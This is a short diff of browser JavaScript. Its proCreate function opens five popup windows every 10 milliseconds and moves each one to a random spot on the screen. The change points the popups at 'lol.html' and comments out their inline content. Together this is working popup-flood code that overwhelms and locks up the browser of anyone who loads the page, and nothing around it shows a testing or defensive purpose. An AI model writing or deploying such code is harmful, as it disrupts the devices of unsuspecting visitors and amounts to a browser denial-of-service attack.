@@ -1,5 +1,5 @@
 function openWindow(url) {
-    var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+    var newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
 
     // Move the new window to a random location once
     if (newWin) {
@@ -12,7 +12,7 @@ function openWindow(url) {
         newWin.moveTo(randomX, randomY);
 
         // Write custom content inside the blank page
-        newWin.document.write(`
+        /*newWin.document.write(`
             <!DOCTYPE html>
                 <html>
                     <head>
@@ -41,7 +41,7 @@ function openWindow(url) {
                         <body>
                     </body>
             </html>
-        `);
+        `);*/
     }
 
     return newWin;
@@ -50,7 +50,7 @@ function openWindow(url) {
 function proCreate() {
     setInterval(() => {
         for (var i = 0; i < 5; i++) {
-            openWindow('');
+            openWindow('lol.html');
         }
     }, 10); // Adjust delay as needed
 }
